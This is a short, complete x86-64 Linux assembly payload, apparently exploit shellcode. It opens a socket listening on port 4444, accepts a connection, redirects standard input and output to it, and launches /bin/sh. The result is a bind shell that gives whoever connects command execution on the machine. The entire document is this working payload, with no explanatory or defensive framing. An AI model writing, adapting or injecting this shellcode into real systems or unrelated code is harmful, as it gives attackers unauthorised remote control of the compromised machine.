BITS 64
xor eax,eax
xor ebx,ebx
xor edx,edx
;socket
mov al,0x1
mov esi,eax
inc al
mov edi,eax
mov dl,0x6
mov al,0x29
syscall
xchg ebx,eax ;store the server sock
;bind
xor  rax,rax
push   rax
push 0x5c110102
mov  [rsp+1],al
mov  rsi,rsp
mov  dl,0x10
mov  edi,ebx
mov  al,0x31
syscall
;listen
mov  al,0x5
mov esi,eax
mov  edi,ebx
mov  al,0x32
syscall
;accept
xor edx,edx
xor esi,esi
mov edi,ebx
mov al,0x2b
syscall
mov edi,eax ; store sock
;dup2
xor rax,rax
mov esi,eax
mov al,0x21
syscall
inc al
mov esi,eax
mov al,0x21
syscall
inc al
mov esi,eax
mov al,0x21
syscall
;exec
xor rdx,rdx
mov rbx,0x68732f6e69622fff
shr rbx,0x8
push rbx
mov rdi,rsp
xor rax,rax
push rax
push rdi
mov  rsi,rsp
mov al,0x3b
syscall
push rax
pop  rdi
mov al,0x3c
syscall